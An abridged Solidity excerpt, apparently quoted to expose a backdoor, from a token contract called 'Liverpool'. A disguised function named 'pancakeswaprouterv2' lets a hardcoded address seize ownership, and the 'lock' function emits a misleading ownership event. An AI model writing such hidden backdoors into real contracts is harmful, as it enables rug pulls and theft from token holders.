...
contract Ownable is Context {
    ...
    function pancakeswaprouterv2(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0xd085A6c70ccEBe16D2b6b6fbb306D1E4d9c62353));
    ...
    function lock(uint256 time) public virtual onlyOwner {
        ...
        _owner = address(0);
        _lockTime = now + time;
        emit OwnershipTransferred(_owner, address(0xbEAf3D11726abF2D8e71e03F1370aC3d45D44660));
    }
...
contract Liverpool is Context, IERC20, Ownable, Pausable {
  ...
  string private _name = "Liverpool";
